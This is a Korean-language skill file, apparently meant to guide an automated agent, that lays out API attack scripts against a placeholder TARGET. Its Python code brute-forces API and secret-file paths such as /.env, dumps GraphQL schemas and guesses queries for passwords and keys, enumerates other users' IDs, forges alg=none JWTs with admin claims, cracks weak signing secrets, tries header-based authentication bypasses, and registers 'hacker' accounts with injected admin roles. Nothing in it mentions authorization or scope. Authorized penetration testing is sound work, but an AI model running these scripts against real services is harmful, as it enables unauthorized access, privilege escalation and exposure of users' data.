# SKILL: API Security Testing

## 목적
REST API, GraphQL, JWT, OAuth 2.0 취약점 자동 탐지.
API는 일반 웹보다 취약점이 더 많고 탐지가 쉬움.

---

## PHASE 1: API 엔드포인트 발견

### 공통 경로 브루트포스
```python
import sys, os
sys.path.insert(0, os.path.expanduser("~/.bingo"))
from recon_tools import Recon

api_paths = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    "/graphql", "/graphiql", "/playground",
    "/swagger", "/swagger-ui", "/swagger-ui.html",
    "/api-docs", "/openapi.json", "/api/swagger.json",
    "/docs", "/redoc",
    "/api/users", "/api/admin", "/api/auth",
    "/api/login", "/api/register", "/api/token",
    "/rest", "/rest/v1", "/rest/api",
    "/.well-known/openid-configuration",   # OAuth discovery
    "/oauth/authorize", "/oauth/token",
    "/.env", "/config.json", "/settings.json",
]

import httpx
client = httpx.Client(verify=False, timeout=8, follow_redirects=True)
base = "https://TARGET"

found_apis = []
for path in api_paths:
    r = client.get(base + path)
    if r.status_code not in (404, 400):
        print(f"[API] {r.status_code} {base+path} ({len(r.text)}B)")
        found_apis.append({"url": base+path, "status": r.status_code})
```

---

## PHASE 2: GraphQL 탐지 및 인트로스펙션

```python
# GraphQL 인트로스펙션 (스키마 전체 유출)
import httpx, json

graphql_url = "https://TARGET/graphql"

introspection_query = """
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name kind } }
      }
    }
  }
}
"""

r = httpx.post(graphql_url,
    json={"query": introspection_query},
    headers={"Content-Type": "application/json"},
    verify=False
)

if r.status_code == 200 and "data" in r.text:
    data = r.json()
    types = data.get("data", {}).get("__schema", {}).get("types", [])
    for t in types:
        if not t["name"].startswith("__"):
            fields = [f["name"] for f in (t.get("fields") or [])]
            if fields:
                print(f"[GRAPHQL] Type: {t['name']}, Fields: {fields}")
else:
    print("[GRAPHQL] Introspection disabled or not GraphQL")

# 인트로스펙션 차단 시 — 필드 추측
guess_queries = [
    '{ user(id: 1) { id username email password } }',
    '{ users { id username email } }',
    '{ admin { secretKey token } }',
    '{ me { id username role } }',
]
for q in guess_queries:
    r = httpx.post(graphql_url, json={"query": q}, verify=False)
    if "errors" not in r.text and r.status_code == 200:
        print(f"[GRAPHQL] Query succeeded: {q[:60]}")
        print(f"  Response: {r.text[:200]}")
```

---

## PHASE 3: REST API IDOR / BOLA 테스트

```python
# BOLA (Broken Object Level Authorization)
import httpx

client = httpx.Client(verify=False, timeout=8)
headers = {"Authorization": "Bearer YOUR_TOKEN"}

base_endpoint = "https://TARGET/api/v1/users"

# 현재 유저 확인
me = client.get(f"{base_endpoint}/me", headers=headers).json()
my_id = me.get("id", 1)
print(f"[BOLA] My ID: {my_id}")

# 다른 유저 ID로 접근
for test_id in [1, 2, 3, my_id - 1, my_id + 1, 0, 9999]:
    if test_id == my_id:
        continue
    r = client.get(f"{base_endpoint}/{test_id}", headers=headers)
    if r.status_code == 200:
        data = r.json()
        print(f"[BOLA] VULNERABLE! id={test_id} accessible: {str(data)[:100]}")
    elif r.status_code == 403:
        print(f"[BOLA] id={test_id} → 403 Forbidden (protected)")

# 관리자 엔드포인트 접근 시도
admin_endpoints = [
    "/api/v1/admin/users",
    "/api/v1/admin",
    "/api/v1/users?role=admin",
    "/api/v1/users?admin=true",
]
for ep in admin_endpoints:
    r = client.get("https://TARGET" + ep, headers=headers)
    if r.status_code == 200:
        print(f"[BFLA] Admin endpoint accessible: {ep}")
```

---

## PHASE 4: JWT 공격

```python
import base64, json, hmac, hashlib

def decode_jwt(token):
    parts = token.split(".")
    def b64d(s):
        s += "=" * (4 - len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))
    return b64d(parts[0]), b64d(parts[1]), parts[2]

token = "YOUR_JWT_TOKEN"
header, payload, sig = decode_jwt(token)
print(f"[JWT] Header: {header}")
print(f"[JWT] Payload: {payload}")

# 공격 1: alg=none 위조
def forge_none_alg(payload_data):
    h = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).rstrip(b"=").decode()
    return f"{h}.{p}."

# payload에 admin 권한 추가
admin_payload = {**payload, "role": "admin", "is_admin": True, "sub": "1"}
forged = forge_none_alg(admin_payload)
print(f"[JWT] Forged (alg=none): {forged}")

# 공격 2: 약한 시크릿 크래킹
import httpx
weak_secrets = ["secret", "password", "key", "jwt", "test", "12345",
                "qwerty", "admin", "token", ""]
parts = token.split(".")
msg = f"{parts[0]}.{parts[1]}".encode()
for secret in weak_secrets:
    sig_test = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    if sig_test == parts[2]:
        print(f"[JWT] WEAK SECRET FOUND: {secret!r}")
        break
```

---

## PHASE 5: API 인증 우회

```python
import httpx

client = httpx.Client(verify=False, timeout=8)
target = "https://TARGET/api/v1/users"

# 1. Authorization 헤더 변형
auth_bypass = [
    {},                                                    # 헤더 없음
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"Authorization": "Bearer 0"},
    {"Authorization": ""},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},          # admin:admin
    {"X-API-Key": "admin"},
    {"X-API-Key": ""},
    {"X-Admin": "true"},
    {"X-Internal": "true"},
    {"X-Forwarded-For": "127.0.0.1"},                     # 내부 IP 위장
]

for headers in auth_bypass:
    r = client.get(target, headers=headers)
    if r.status_code == 200 and len(r.text) > 50:
        print(f"[API AUTH] Bypass with headers: {headers}")
        print(f"  Response: {r.text[:200]}")
```

---

## PHASE 6: Rate Limit / Mass Assignment 테스트

```python
# Mass Assignment — 추가 필드 주입
import httpx, json

register_url = "https://TARGET/api/v1/register"
payloads = [
    {"username": "hacker", "password": "pass123", "role": "admin"},
    {"username": "hacker2", "password": "pass123", "is_admin": True},
    {"username": "hacker3", "password": "pass123", "user_level": 9},
    {"username": "hacker4", "password": "pass123", "verified": True},
]
for p in payloads:
    r = httpx.post(register_url, json=p, verify=False)
    print(f"[MASS ASSIGN] {p} → {r.status_code}: {r.text[:100]}")
```

---

## 체크리스트

- [ ] Swagger/OpenAPI 문서 접근 가능 여부
- [ ] GraphQL introspection 활성화 여부  
- [ ] BOLA/IDOR — 다른 사용자 ID 접근
- [ ] BFLA — 낮은 권한으로 관리자 기능 접근
- [ ] JWT alg=none / 약한 시크릿
- [ ] Mass Assignment — 등록 시 권한 필드 주입
- [ ] Rate Limit 없음 (브루트포스 가능)
- [ ] CORS 오설정 (API에서 매우 흔함)
- [ ] API 버전 다운그레이드 (v1이 v2보다 취약)
